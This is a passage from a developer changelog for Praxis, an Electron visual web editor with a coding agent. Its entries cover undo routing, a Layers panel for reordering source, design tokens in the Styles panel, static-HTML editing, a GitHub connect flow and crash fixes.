them IS the bug: the menu template had `{ role: 'editMenu' }`, whose built-in
Undo/Redo items own the Cmd+Z / Shift+Cmd+Z accelerators at the NATIVE menu
level. A physical keystroke is intercepted in the main process and routed to
`webContents.undo()` (text-editing undo) — the renderer's keydown listener
(App.tsx, the v8 F3b source-edit undo) never fires. Synthetic/CDP key events
(what every test uses, including the previous entry's probe) BYPASS menu
accelerators, so the keydown handler fired in tests and the feature looked
alive. Real-keyboard source undo has therefore been broken since the role was
added — for props/text/token edits too, not just layer moves.

Fix, three routing layers (menu template + App.tsx + a new tiny IPC):
- `role: 'editMenu'` → explicit Edit submenu. Undo/Redo are custom items
  whose click handlers route: a non-main focused webContents (preview, props
  island, pop-out editor) gets plain `webContents.undo()`/`redo()` — exactly
  what the role did, incl. CodeMirror, which maps the native historyUndo
  beforeinput to its own history — while the MAIN renderer gets a
  `menu:action 'undo'/'redo'` and decides for itself. Clipboard items stay
  roles.
- App.tsx: the undo logic is shared between the (kept, now mostly-backup)
  keydown listener and the new menu-action branch. Focused text field → ask
  main to replay the NATIVE editing command (`menu:native-edit` →
  `mainWindow.webContents.undo()`), because the custom accelerator swallowed
  the keystroke the field would have received; anything else → the source-edit
  stack.
- LayersTree: the drag's `preventDefault()` on pointerdown also suppressed the
  default focus move, stranding focus in the composer textarea — so even with
  the menu fixed, Cmd+Z after a drag would have hit the field's native undo.
  `beginDrag` now focuses the row explicitly (rows are tabIndex=0).

`test/layers-panel.mjs` now drives undo through the REAL path — main sending
`menu:action 'undo'` (which is precisely what a physical Cmd+Z produces) —
and pins BOTH routing branches: row-focused → the move reverts; composer-
focused → source files must NOT change, and after blur the same action
reverts. New CLAUDE.md gotcha: menu accelerators beat renderer keydown, and
synthetic test events bypass menu accelerators — a keydown-handler test can
stay green while every real keyboard is broken.

## 2026-07-29 — Pinned-ask fade fix + confirmed Cmd+Z covers Layers drags

User report: "when I scroll and one message starts pushing another one, the
top message goes over, not behind gradient line on the top." Root cause,
confirmed by two independent code investigations: `.msg--user-pinned`
(styles.css, the collapsed/sticky user-ask bubble) had `z-index: 6`, a
DELIBERATE prior choice ("so the pinned ask stays crisp over it") — but it's
applied to every collapsed ask for the whole time it's collapsed, not only
while genuinely stuck at `top: 44px`, so during the sticky hand-off between
two turns the outgoing bubble also rendered above `.pane--chat::before`'s
`z-index: 5` top fade instead of dissolving under it. No intervening
stacking context exists anywhere in the chain (`.pane--chat` → `.chat__messages`
→ `.chat__scroll` → `.turn` → `.msg`), so the two z-indexes compete directly —
confirmed live via computed-style check (`getComputedStyle` reported the
bubble's z-index as the raw `6`/`5` numbers, no scoping).

User confirmed they want it to fade like everything else. Fixed:
`z-index: 6` → `z-index: 1` on `.msg--user-pinned` — low enough to sit below
the gradient (5), but still an explicit positive value so the pinned bubble
keeps winning over its own turn's z-index:auto content scrolling beneath it
(removing the z-index entirely would have silently broken the sticky visual
effect itself, not just its relationship to the fade). Verified live:
`getComputedStyle` now reports `1` for the bubble vs `5` for the gradient.

Also verified, no code needed: dragging a Layers-panel row and pressing a
REAL Cmd+Z keystroke (not just calling `window.api.edits.undo()` directly)
correctly reverts the move. Layer-panel moves already go through the same
`commitEdit`/`edit-history.ts` stack as every other direct source edit, and
`App.tsx`'s global Cmd+Z handler already operates over that same per-root
stack — so this "just worked" once the move engine (2026-07-29, Layers panel)
landed.

## 2026-07-29 — Rules v9: trigger-first line_height section (found by a new live test)

New live-tier test `test/tool-invocation.mjs` asks the opposite question from
every other tool test: not "does the tool work when called" but "do the rules
make the agent CALL it at all", from natural design prompts that never name a
tool. First run caught a real miss: `check_contrast` fired spontaneously,
`line_height` never did — the agent hand-wrote the CSS instead.

The difference was rule *shape*, not tool quality: `check_contrast` opens its
own section with a trigger condition ("Whenever you pick, change, or review a
text/UI color pair…"), while `line_height` was the fourth bullet in the shared
calculators list, phrased as value substitution ("not a hardcoded 1.5").
Adding body copy doesn't pattern-match "exact math you should not eyeball", so
the push never landed — even though the SDK tool description already said
"Call this WHENEVER you set a font-size or line-height". Lesson: the always-on
rules steer tool *reach*; descriptions only matter once the model is already
looking. Fix (v9): `line_height` got its own "Type metrics" section with the
same trigger-first phrasing, covering new text content (headings/body/captions)
explicitly. Both probes now pass live; `test/rules.mjs` pins the new section.

A v0.app-style Layers panel — a tree of the previewed page's DOM at the top of
the chat column, click a row to select, drag a row to reorder in real source.

**The decisive constraint, found before writing anything:** a
`data-praxis-source` stamp identifies a JSX/element node in *source*, not a
rendered *instance*. A `.map()` over N items puts the identical stamp on N DOM
nodes — there is no way to tell "move rendered item 3 before item 1" apart from
the reverse, because in source there's only one node. So drag-to-reorder is a
real code edit for distinct siblings, and an inherently agent-routed judgment
call for list items/reparenting/cross-file — the same `needsAgent` fallback
every other direct-edit engine in this app already uses.

**Tree read** (`src/preview/layers.ts`, new preload sibling module) walks from
`document.body` — not `documentElement`, which is where all of Praxis's own
overlay chrome lives, so it's excluded for free. Node identity is a DOM
child-index path (`[0,2,1]`), recomputed fresh on every read and never
trusted across snapshots: `data-praxis-source` isn't unique and `cssPath` is
too lossy to serve as a handle. A bulk read is a request-id round trip
(`layers:read`/`layers:read-reply`), the same shape as the Styles tab's
`styles:read` — the preview preload is sandboxed, so any bulk read of its
isolated world can only ever be message-passing, never `executeJavaScript`.

**Selection reuses the real click path.** A Layers row click sends
`layers:select {path, fingerprint}`; the preload re-resolves the path
(re-validating a `{tag, source}` fingerprint — the same self-healing
discipline `resolveStyleTarget()` uses), then calls the *exact* functions the
real in-page click handler calls (`describe`/`showToolbar`/
`setSelectionHighlight`). Zero new renderer-side selection logic, a real
in-page outline, and it works independent of Select-mode by construction —
none of those functions gate on it.

**Freshness** is a debounced, `childList`-only `MutationObserver`, armed only
while the panel is open (`layers:set-watch`, mirroring `SET_FRAME`'s exact
on/off shape) plus explicit reads on open/`preview:url-changed`/after a
successful move. Deliberately not wired to every prop/style edit elsewhere —
the observer already catches anything that changes the tree's *shape*, and a
same-shape edit (recoloring, retyping) has nothing here to go stale.

**The panel** (`LayersPanel.tsx` host + `LayersTree.tsx` pure render/drag) sits
as a `flex-none` sibling above `ChatPanel`'s `<Conversation>`, with the same
`pt-11` top padding `ConversationContent` already uses to clear the
`.chat-drag` window-drag strip and the top gradient fade. Hand-rolled, not
`@pierre/trees` (already a dep, used in the pop-out code editor): its model is
alphabetically-sorted path strings with `directory|file` semantics, the wrong
shape for a DOM tree where duplicate-tag siblings must stay in exact DOM order
and the drop gesture is "between these two specific siblings," not "into a
folder." Every existing drag interaction in this codebase (resize handles,
ScrubInput, BezierEditor) is already hand-rolled pointer math with no dnd
library anywhere.

**The move engine** ships for React, Svelte, and static HTML in v1 — mirroring
the codebase's existing per-framework pairing (`props.ts`/`props-svelte.ts`).
React Native and Vue are out, not deferred: RN's preview is an iOS-simulator
MJPEG bridge with no live DOM, and Vue uses its own devtools inspector instead
of a stamp — neither has anything for a mover to hook into yet.

v1 scope is deliberately narrow: **same-file, same-immediate-parent
`before`/`after` only.** `inside` (reparenting) is always `needsAgent` — same
parent is the one case where scope-safety (does the moved node reference
locals only valid at its old position?) is trivially guaranteed, and it's also
an indentation win: identical nesting depth means the target's own leading
whitespace is already the right template for the moved node's new position.
The gates, in order: same stamp on both sides → `needsAgent` (cheapest,
decisive — the case a `.map()`/`{#each}` produces); different files →
`needsAgent`; not true siblings under one parent → `needsAgent`; either side
statically inside a `.map()`/`.filter().map()` call, a `{cond && <X/>}`/
ternary container (React), or an `{#each}`/`{#if}` block (Svelte) →
`needsAgent` (catches the case where the *current* render shows one instance
but the template isn't safe to hand-splice). None of this trusts the renderer
for correctness — the Layers tree's own `dupStamp` flag (computed client-side
during the walk) is only a pre-flight UX hint that disables dragging on rows
already known to be templated; the actual gate is main re-deriving everything
from source.

**The splice** (`src/main/move-node-splice.ts`, new, deliberately dependency-
free) rebuilds the parent's entire content span from an ordered list of
original child text runs, rather than incremental substring surgery — every
untouched sibling's text is copied byte-for-byte, and only the separator
immediately around the moved node is recomputed. One real bug caught by its
own unit test before it ever reached the Electron tier: the first version
borrowed the separator gap *after* the target when inserting `after`, which
is a sibling gap for every target except the *last* child, where it's
actually the boundary gap before the parent's closing tag (usually
less-indented or absent) — fixed by always preferring the gap *before* target
regardless of `position`, falling back to the one after only when target is
first. `test/layers-move.mjs` pins this with hand-built `{start,end}` node
stand-ins over literal strings — no real parser needed, since the algorithm
only ever touches spans + a whitespace predicate.

**A parent-tracking primitive didn't exist anywhere in this codebase** — every
existing AST walker (`props.ts`'s `collectNodes`, `props-svelte.ts`'s
`collectElements`, `html-source.ts`'s `walkElements`) only collects nodes
matching a type, never tracking parent/children. New shared, framework-
agnostic `src/main/ast-walk.ts` (`findContainer`/`ancestorChain`, duck-typed
over `.type`) is used by both the React and Svelte movers; static HTML gets
its own smaller version instead, because parse5's tree carries `parentNode`
back-references that a naive generic key-walk would loop on — descending via
`childNodes` only sidesteps that risk entirely rather than special-casing it.

**Two `props.ts`/`props-svelte.ts` refactors, additive only, zero behavior
change:** `findElementAtLine` split into `locateJsxOpening(ast, line, col)` +
a thin parse wrapper, so the movers can parse a file ONCE and locate both the
dragged and target elements against the identical ast (their JSX node objects
must be reference-equal for the container lookup to work at all); and
`parseFile`/`collectNodes`/`BabelNode`, `parseSvelte`/`Node`, all promoted
from module-private to exported, mirroring what was already exported.

**Why the splice algorithm lives in its own file, and why the unit test only
covers it:** `move-node.ts` imports `commitEdit`/`resolveSource` from
`props.ts`, which imports `electron` at module scope — so the whole file (and
anything that imports it) can't load under plain bun. `control-manifest.ts`/
`control-panels.ts` already established the fix for exactly this shape:
factor the pure part into its own electron-free module. The AST-aware gating
(same-source, same-parent, templated-container detection) still can't be
unit-tested this way — it's covered end-to-end in `test/layers-panel.mjs`
instead, against a new fixture (`test/fixtures/layers-app/`) with a real
`src/Layers.tsx` backing a served `index.html`: a `<ul>` of three distinctly-
stamped `<li>`s (the direct-move path) and a second `<ul>` whose three
rendered `<li>`s all carry the *identical* stamp (the `.map()`/needsAgent
path). The drag itself is dispatched as real `PointerEvent`s at the rows' own
on-screen coordinates, driving `LayersTree`'s actual pointer-gesture code —
not a direct engine call standing in for the UI.

**One environment-driven test fix, not a product bug:** `win.click()`
(Playwright's real actionability-checked click) stalled for its full 30s
default timeout on this machine for reasons unrelated to the feature — the
same class of environment quirk that affects the props island elsewhere in
this suite (documented in the 2026-07-28 entry). Dispatching the click via
`element.click()` inside `page.evaluate()` instead — the same event the
button's `onClick` receives either way — resolved it instantly. Confirmed via
a throwaway probe script that the feature itself (preview load, panel open,
10 tree rows, click-select, and the drag reordering `Alpha/Beta/Gamma` →
`Gamma/Alpha/Beta` in `src/Layers.tsx` with exactly the right indentation)
all worked correctly the whole time — this was purely a test-harness fix.

Tests: `test/layers-move.mjs` (new, unit tier) and `test/layers-panel.mjs`
(new, electron tier) both green; `node test/run.mjs unit` 40/40. Follow-ups
(reparenting, a "save as token"-style promotion, whether `inside` is ever
worth mechanizing) are in `docs/TASKS.md`.

## 2026-07-28 — Design tokens in the Styles panel (user-requested)

The Styles tab was token-blind: it read computed CSS and showed the raw value —
`color: #6c6c6c` — for a project that calls that `--color-text`. Tokens were
already detected (`tokens.ts`) and parked in `useTokens`, but the only consumers
were the chat's scaffold offer and a `props:applyToken` IPC **no renderer code
calls** (dead since `TokenPalette.tsx` was removed). Now the panel names the
token, offers a picker on every token-able row, and commits a *reference*.

**Matching lives in `src/shared/token-match.ts`** (new, pure) because both sides
need it — the island to render, main to re-validate. Its load-bearing rule: a
token's **value shape gates** what it may be offered for; its **group name only
ranks**. Group names are unconstrained (a manifest may name a group `brand`, a
CSS-var scan derives them from the first name segment, Tailwind uses
`colors`/`spacing`/…), so ranking on them is fine and excluding on them is not.
That's what keeps `--z-modal: 100` out of the padding picker while still
surfacing a spacing scale someone filed under `brand`.

**Resolution is based on the LIVE custom property, not the token file.** The
motivating repo (lkmv.ch) redefines every color under
`@media (prefers-color-scheme: dark)`, and `fromCss` keeps the first occurrence
— so a static value comparison silently fails in dark mode. Instead the panel
asks `styles.read` for the token names themselves: `readStyles` already forwards
whatever strings it gets to `getPropertyValue`, so custom properties worked
**with no new IPC** (only the 64-prop cap needed raising). The recorded value is
the fallback when a name doesn't resolve. Ties are real — a theme with
`--color-title` and `--color-link` both `#212121` — so one winner is always
chosen deterministically (class-list corroboration → group affinity → the
sticky previous pick → detection order) rather than showing "2 tokens".

**Commits write a reference.** `StyleEdit.token` carries only a name + group;
`main/style-tokens.ts` re-detects the project's tokens, re-runs the same
value-shape gate, and produces the text to splice — so nothing the island claims
is written verbatim. A Tailwind-sourced token becomes a class
(`rewriteClassListToken` → `text-brand-500`); a CSS-var token deliberately
*skips* S1 and falls to S2, because taking the class path would write
`text-[#6c6c6c]` — hard-coding the very value the user asked to stop hard-coding.
`edit.value` still carries the resolved css text, so live preview, the
post-commit reconcile and Replay all keep working against something concrete.
An unresolvable token is dropped **silently** and the edit lands as a plain
value edit: the value is still right, only the reference is unavailable.

**UI: inline expansion, never a popover.** The island is a transparent
WebContentsView sized to hug the card, so a portal dropdown clips at the view
edge. A chevron expands `TokenPicker` under the row (what SideRows and
BezierEditor already do; PanelApp's ResizeObserver grows the view). Colors get a
swatch grid, lengths a name/value list; hovering previews live. A row with no
offerable token renders byte-identical to before — token-less projects see no
layout change at all. `ScrubInput.formatValue` shows the token name on numeric
rows, and reverts to plain css text the moment a scrub moves off the committed
value (freezing the name mid-drag would misreport what's about to commit).

**Detection gaps closed:** `findCssFiles` now scans `.less`/`.sass`/`.styl`/
`.pcss` (custom properties pass through preprocessors untouched — lkmv.ch keeps
its whole theme in `src/routes/styles.less` and was invisible), the walk reaches
depth 6 / 120 files (a monorepo's `packages/ui/src/styles/tokens.css` is depth
5), and the emitted set is capped at 400 since a `TokenSet` now rides in every
`PanelState` push. Preprocessor *variables* (`@brand:`, `$brand:`) are
deliberately still ignored — they have no runtime form, so they could never be
committed back as a reference.

**Groundwork, no behavior change:** `StylePanel.tsx` (839 lines, guideline ~500)
split into `components/styles/rows/*`; `sameCssValue`/`numericValue`/`toCssText`/
`parseColorLike` moved to `lib/css-values.ts`, which meant first moving
`TW_EASE_EQUIV` + `displayBezierPreset` down out of `BezierEditor.tsx`
(`sameCssValue` depends on them, and a lib can't import a component).

**Two things the plan got wrong, found while building:**
- The reviewed plan claimed a live duplicate-class bug from `element.classes`
  being a pick-time snapshot, and proposed widening `styles.read` to return
  fresh classes. It isn't a bug: `applyStyleEdit` reads the class list from the
  **source file** (`styles.ts:146`); `edit.classes` only gates `looksTailwind`.
  The widening was dropped — the class list is consulted only as a tie-break,
  where staleness degrades gracefully.
- `--z-modal: 100` **is** a legal `font-weight`, so no value-shape rule can
  exclude it. `test/token-match.mjs` asserts the honest behavior: offered, but
  ranked `neutral` so it sits below any real weight scale.

Tests: new `test/token-match.mjs` (unit tier — value kinds, affinity, the
per-prop gate incl. both negative cases, reference forms per source, and the
tie-break); `tw-styles.mjs` extended for `tailwindTokenClassFor` /
`rewriteClassListToken`; `tokens.mjs` extended with a depth-5 `.less` fixture
that also pins first-definition-wins and proves a LESS variable never becomes a
token; `style-edit.mjs` drives the real island — the chip names `--color-text`,
the picker offers *only* the color tokens, clicking `--color-title` writes
`var(--color-title)` (never `#212121`), and one undo restores it. The fixture
`propedit-app` gained `src/theme.css` + a `TokenCard`, making it a css-source
project. Writing that test caught a real bug in the test itself: a
document-wide `.stylepanel__token-toggle` grabs the *padding* row's toggle,
since every token-able row now has one.

**Verification status, honestly:** unit tier 39/39 (incl. the new
`token-match`), plus `tokens` / `tokens-scaffold` / `prop-edit-svelte` /
`text-edit` / `setup-detect` green. The island-DOM-driven Electron tests
(`style-edit`, `select-element`, `custom-controls`, `ready-gating`, and
eventually `prop-edit`) could NOT be verified on the machine this was written
on: the island `WebContentsView` renders an empty document there, so every
`.proppanel__*` / `.stylepanel__*` wait times out. That is **pre-existing** —
all four fail identically with this entire change stashed at HEAD, so it's the
environment (the Electron window never taking focus), not the feature. Inside
`style-edit`, the token-source header and the `--color-text` chip assertions
did pass on the one run that got that far; the picker/commit assertions written
after the selector fix are unverified. Re-run `node test/run.mjs electron`
somewhere the window can actually take focus before trusting them.

## 2026-07-27 — Don't offer/greypanel setup a project can't do (user feedback)

Feedback from a vanilla single-HTML project (whole DOM assembled at runtime from
JS string-templating, so nothing is source-mapped): the "Set this project up for
visual editing?" card still appeared and dead-ended on *"Couldn't detect a
supported framework"*, and the Styles tab showed a full set of greyed-out,
fake-editable controls under a terse "Ask Praxis below." Two real gaps:

1. **The offer was gated only on stamp count** (`stamps === 0`, `App.tsx`),
   never on whether setup was *possible* — so a static/vanilla/unsupported repo
   got a live "Set it up" button whose only outcome was the error message.
2. **The Styles panel's read-only state didn't say what to do** — and looked
   like a broken editor rather than an intentional read-only view.

Fix — a read-only "can we instrument this?" probe threaded to both surfaces:
- **`setup.ts` `setup:detect` IPC** — runs the existing deps-based `detect()`
  WITHOUT writing, returns `{ framework, canInstrument }` (`canInstrument =
  framework !== 'unknown'`, i.e. react/rn/svelte/solid/vue → true, vanilla →
  false). New `SetupProbe` type + `PraxisApi.setup.detect` + preload bridge.
- **The offer now gates on `canInstrument`** (`useSetup.canInstrument`, probed on
  open next to `tokens.detect`; the readiness handler lazily probes + caches if
  it fires first). A static/vanilla project never gets the dead-end card. A
  supported framework is unchanged (React scaffold still offers — that's correct,
  per the user: "for projects created in praxis it's definitely how it should
  work").
- **`StylePanel` read-only state reworked** — when the picked element has no
  source stamp it no longer renders the greyed control list; it shows *why* it's
  read-only + *what to do*, tailored by `canInstrument` (threaded through
  `PanelState`): `false` → "built at runtime, ask Praxis in chat and it'll edit
  the code"; `true` → "set up visual editing (offer in chat)"; plus an **"Ask
  Praxis to restyle it"** button that seeds the composer.

Verified: `typecheck` + full unit tier (38/38) + `build`; extended
`setup-detect.mjs` with the probe (react/rn/svelte/solid/vue → canInstrument
true, unknown + a real no-package.json vanilla dir → false, writes no `.praxis`);
`ready-gating` (React offer still shows) + `style-edit` (editable path intact)
green. The two new UI states are best eyeballed live (the user is running the
app) — a driven screenshot test for the static path is a good follow-up.

## 2026-07-25 — Fix two stale code-drawer UI tests

`code-peek` and `code-drawer` failed on the electron tier — and, crucially, on
the pre-work baseline too, so not a regression: the drawer UI evolved but the
tests didn't follow.
- `code-peek` waited for `.codedrawer__expand`, an explicit expand toggle that
  no longer exists (replaced by dragging the drawer's top edge, `__resize`).
  Now asserts open-in-editor + the drag-resize handle.
- `code-drawer` clicked `.codedrawer__close` in the popped-out editor *window*,
  which intentionally has no in-editor close (it uses the native traffic lights,
  `!isWindow` guard in CodeDrawer.tsx). Now closes via `editorWin.close()`.

Both deterministic green after the fix (2/2 each). The other four electron-tier
failures that turned up (`rail`, `rail-collapse`, `style-edit`, `custom-controls`)
are timing flakes — each passes in isolation / on retry — not addressed here.

## 2026-07-24 — Vanilla-JS editing, Tier 2: click-to-code + inline text edit

Tier 2 of the vanilla-JS editing plan (Tier 1 added the header code-editor
door). The key move: a static site's served bytes ARE the on-disk file, so the
DOM→source map framework projects manufacture with a build-time plugin is nearly
free — compute it at serve time.

- **`src/main/html-source.ts`** (new, over parse5 via dynamic import):
  `stampHtml(html, relpath)` injects `data-praxis-source="relpath:line:col"`
  into each stampable element's start tag (attribute-only, idempotent, skips
  head/script/style, degrades to the input on parse failure);
  `spliceHtmlText(html, line, col, text)` rewrites a stamped text leaf back into
  the file (null → agent fallback for element/comment children or void tags).
  Pure, unit-tested (`test/html-source.mjs`).
- **`static-server.ts`** stamps every served HTML response before the live-reload
  snippet. So clicking an element in a vanilla preview now yields a `source`,
  which lights up the existing machinery for free: the element "code" button
  opens the drawer at the right line, and `isTextEditable` (stamp + text-leaf,
  already framework-agnostic) enables double-click text editing — no preview
  changes needed.
- **`props.ts`** `applyTextEdit` gains an `.html` branch → `spliceHtmlText` →
  `commitEdit` (undo/redo, conflict detection, live-reload), mirroring the
  JSX/Svelte paths. JS-generated DOM (no source location) falls back to chat, as
  decided.
- Adds parse5. Tests: `html-source` (unit), `html-text-edit` (integration, real
  `text:apply` IPC), and a stamp assertion in `static-serve`.

Verified: typecheck + unit tier (38/38) + build + `static-serve` and
`html-text-edit` electron tests (with isolated `PRAXIS_USER_DATA`). Note: run
electron tests via `node test/run.mjs electron` (or with `PRAXIS_USER_DATA` set)
— running the files directly reuses real userData and the app auto-restores a
stale project instead of the empty state.

## 2026-07-24 — Vanilla-JS editing, Tier 1: a door into the code editor

Discovery turned up a sharp gap: a vanilla-JS / static project **can't open the
code editor at all** from the UI. The drawer is fully capable (edit + save any
file, conflict detection, undo/redo, live-reload, IDE hand-off) and its file
tree works for any project — but the only two ways *in* are the element
toolbar's "code" action (hidden unless the element has a `data-praxis-source`
stamp) and the file tree (which lives *inside* the drawer). A static project has
no build step to inject the stamp, so both dead-end.

Tier 1 (of a two-tier plan — decided: Tier 1 now, Tier 2 next):
- **A stamp-independent door.** New `Code2` icon button in the preview header
  (`.previewbar__actions`, shown while the preview runs) toggles the code drawer
  for *any* project. `toggleCodeDrawer` picks a sensible starting file (the HTML
  entry when there is one, else the first file) via `source.tree`, then the
  drawer's file tree takes over. `App.tsx`.
- Universal, not framework-gated — it's additive next to the element→code path.

Tier 2 (follow-up): serve-time `data-praxis-source` stamping in
`static-server.ts` (the served bytes ARE the on-disk file, so the DOM→source map
is nearly free) + an HTML text-splice engine, to light up click-element-to-code
and inline text editing that writes back to the HTML. Decided: JS-generated DOM
(no source location) falls back to chat, like framework projects do today.

Verified: typecheck (node/web/preview) + build. UI test (Code button opens the
drawer + tree) is a follow-up.

## 2026-07-24 — "Connect to GitHub": the first-publish bridge

A first-time user scaffolds a project, builds it locally (delightful, zero-
config), then hits **Publish** — and dead-ends on `No "origin" remote — add
one, then publish.` (`annotations.ts`). Everything up to that point needs no
git/GitHub knowledge; Publish suddenly assumes a repo already exists, an
`origin` is set, and `gh` is installed + authed. The one-click promise broke
exactly at the moment of pride.

New distinct step (product decisions: **separate** action, **private** default,
lean on **gh**, **guide** don't automate, repo reflects the built work — Option B):

- **`src/main/github.ts`** — `githubStatus(root)` (link state + gh readiness,
  prefills the sheet) and `connectToGitHub(root, {name, owner, private})`:
  preflight gh install+auth → fast-forward the clean base up to the work branch
  when it's an ancestor (so the repo's default branch shows what the user built,
  not the bare scaffold) → `gh repo create --private --source . --remote origin`
  → push default + work branch → set default branch + `origin/HEAD`. Defensive:
  every failure returns `{ ok, error }`.
- **`src/shared/github.ts`** — pure, testable helpers: `sanitizeRepoName` and
  `resolveConnectPlan` (the Option-B branch logic). `test/github-connect.mjs`.
- **Renderer** — `useGithub` store holds the opened project's status (null for
  non-repos → header keeps Publish). The header swaps Publish for **"Connect to
  GitHub"** until an `origin` exists (`App.tsx`); once connected, Publish returns
  and works unchanged. New `ConnectDialog` (mirrors FeedbackDialog's preview-
  freeze): name (live-sanitized), owner (login + orgs), Private default; gh
  missing/unauthed shows the exact step + a Retry that re-probes.
- Publish (`shipToMain`) is untouched — it just works once a remote is present.

Verified: `bun run typecheck` + full unit tier (37/37, incl. github-connect) +
`bun run build`. NOT yet driven in the Electron UI (no existing harness for the
no-remote fresh-project state) — a tier-2 screenshot test is a good follow-up.

## 2026-07-24 — "/" menu shows all skills (drop the 8-item cap)

The composer's slash menu silently truncated at 8 matches
(`ChatPanel.tsx` did `[...project, ...other].slice(0, 8)`), so anyone with more
than a handful of project skills + backend commands only ever saw a fraction of
them — the rest were unreachable unless you typed enough letters to filter down.

- **Extracted the ranking to `src/shared/slash-menu.ts` (`rankSlashMatches`)** —
  pure (renderer can't import `main/skills.ts`; it pulls in `node:fs`), so it's
  unit-testable and shared. Same behavior as before *minus the cap*: case-
  insensitive substring filter, project skills first, same-named non-project
  command shadowed by its project skill.
- **No cap.** The `.slash` popup already has `max-height: 240px; overflow-y:
  auto`, so overflow was always meant to scroll — the slice just hid it. Project
  skills stay at the front of the list, so they're never the ones scrolled past.
- **Keyboard nav follows the scroll:** an effect calls
  `activeItemRef.scrollIntoView({ block: 'nearest' })` on `menuActive` change, so
  arrowing down past the fold keeps the selected row visible.
- Tests: extended `test/skills-discovery.mjs` with `rankSlashMatches` cases
  (empty query returns all, case-insensitive filter, project-first, shadowing,
  and a >8-match no-truncation regression).

## 2026-07-23 — Stop the "Object has been destroyed" crash dialog on wake

Closing the window (traffic-light close, NOT quit — the app stays alive to own
the dev server) and then sleeping/waking the Mac popped a *series* of Electron
`Uncaught Exception: TypeError: Object has been destroyed` dialogs — from
`powerMonitor` 'resume', a dev-server `Socket.onData`, `WebContents.reportUrl`,
and IPC forwarders.

**The real root cause:** `createWindow()` never nulled `mainWindow` on
`'closed'`. So after the window closed, `mainWindow` (and the child
`previewView`/`panelView`) kept pointing at the *destroyed* objects — every
`mainWindow?.…` guard in the codebase was defeated (non-null but dead). Any
background listener that survives the window and fires on wake then threw.

Fixes, defense-in-depth:
- **`index.ts` — the primary fix:** `mainWindow.on('closed', …)` now nulls
  `mainWindow`, `previewView`, `panelView`, `previewUrl`, `lastPreviewBounds`.
  This makes every `?.` guard short-circuit AND fixes a latent reopen bug
  (`ensurePreviewView`/`ensurePanelView` would otherwise hand back a dead view
  on the next dock re-open).
- **`index.ts` — powerMonitor 'resume':** guards `webContents.isDestroyed()`
  before `.invalidate()`.
- **`index.ts` — top-level backstop:** a `process.on('uncaughtException')` that
  swallows (logs) only `TypeError: Object has been destroyed` — the benign
  post-teardown race — and re-surfaces everything else via `dialog.showErrorBox`,
  so real bugs aren't hidden but a teardown race can't pop the modal.
- **Async-send guards (isDestroyed) for every event-driven `.send()`:**
  `index.ts` `sendToMain()` (all 15 sites, covers `reportUrl` + IPC forwarders),
  `devserver.ts` (`devserver:log`), `backends/tools.ts` `sendToRenderer()` used
  by `claude.ts`/`codex.ts`/`gemini.ts`, `agent.ts` (`safeSend`), `simulator.ts`
  (`sendToWin`), `update-ipc.ts`, `chat-isolation.ts`, `control-panels.ts`.

No behavior change while the renderer is alive; typecheck + unit tier green,
smoke launches clean. NOTE: the fix only takes effect after a rebuild + relaunch
— a running old binary keeps crashing (its stack line numbers are the tell).
(pre-existing `apca` unit skip: `apca-w3` not installed locally.)

## 2026-07-23 — Resumed chats keep their transcript across a window close+reopen

Surfaced once the crash fix above let close+reopen actually complete: after
closing the window (app stays alive on macOS) and reopening, the chat repainted
EMPTY while the preview came back. Not a regression from the crash fix — a
pre-existing gap the crashes had been masking.

Root cause (found via temporary `[restore-debug]` traces in the workspace
snapshot): a chat resumed from disk (`agent:resume-session`) starts a fresh
session with the SDK's `resumeSessionId` and shows the user the past messages
from the on-disk record — but never copied that history into the live
`session.record.transcript`, which only accrues NEW turns. So the reattach source
of truth (`agent:workspace-snapshot`, read on the next boot) saw an empty
transcript and `restore.ts` hydrated a blank chat. The first launch masks it
(it resumes from disk directly); only the SECOND reopen, which reattaches to the
still-live-but-empty record, shows blank.

Fix (`agent.ts` `agent:resume-session`): seed the fresh live record with
`rec.transcript` (entries copied, so a later finalize/push can't mutate the disk
record) right after `adoptSession`, guarded on the live transcript being empty.
Now the live record faithfully mirrors the resumed history, so a reattach
repaints the full chat. Verified live: `transcriptLens` is non-zero on the
second reopen and the chat comes back.

## 2026-07-21 — Per-turn "Revert changes" in the chat

Each completed chat turn's file edits can now be rolled back from a discoverable
per-message button, next to Copy — not just via the invisible, strictly-LIFO
global Cmd+Z. It reuses the existing in-memory edit-history substrate: every
merged turn on a git-repo-root chat is already recorded as one atomic group
`chat:<wtId>:<turnNo>` with full `{before, after}` snapshots, so this is a
surfacing job, not new persistence.

- **`edit-history.ts`** gains two addressable-group functions beside undo/redo:
  `revertGroup(root, group)` restores every file's `before` for ONE group
  anywhere in the stack (not just the top), all-or-nothing, refusing (conflict)
  if any file drifted from the `after` that turn wrote — the same "is this safe?"
  guard `undo` uses. On success the group leaves the undo stack; nothing is
  pushed to redo (revert is a one-way action outside the linear undo/redo model).
  `canRevertGroup` is the cheap drift-aware pre-check for greying the button.
- **IPC trio** (`props.ts` `edit:revert`/`edit:can-revert` → `shared/api.ts`
  `edits.revert`/`canRevert` → `preload`), kept in sync per the usual rule.
- **`chat-isolation.ts`** tags the merged turn: `emitIsolation` now carries the
  `group` id and a `revertable` flag on the `isolation` event. `revertable` is
  `false` once the chat's work is pushed & merged — gated on the session record's
  `prUrl` (held by reference from `adoptSession`, so a later `tag-session` shows
  through). The renderer hides Revert when `revertable === false`.
- **Renderer**: `ChatMessage.revertGroup` + a `tagRevert` store action stamp the
  latest assistant turn from the merged event (before the "Merged into your
  branch" note, so the real turn gets tagged). `RevertAction` sits by `CopyAction`
  in a shared `msg__actions` row; a refused revert shows an inline "Can't revert —
  files changed since this turn" hint. The dev server HMRs the restored files.

**Limitations (by design):** only git-repo-root chats get per-turn groups (subdir
/ non-git projects run on the live tree with no `recordEdit`, so no button, same
as today's undo); history is in-memory (cleared on close/quit); reverting an older
turn no-ops with the conflict hint if a later turn or hand edit touched its files.

Verification: `test/edit-history.mjs` extended (addressable revert, drift conflict,
all-or-nothing group) — unit tier green. New `test/revert-action.mjs` (electron
tier) drives a finished turn, asserts Revert renders only once tagged and sits by
Copy, and clicks it to exercise the full renderer→preload→main round-trip (the
conflict hint). `bun run typecheck` green across node/web/preview.

## 2026-07-20 — Pop-out editor gets a file-tree sidebar; IDE button + close cleanup

The popped-out code editor (`?praxisEditor=1` window) now has a left file-tree
sidebar. Clicking a file opens it in the shared `useCodeDrawer` store, so
Cmd+click navigation and back/forward keep working; the tree mirrors the open
file's selection.

- Tree = **`@pierre/trees`** (trees.software), used via its **vanilla (non-React)**
  entry on purpose: the package's `/react` entry peer-requires React 19 but the
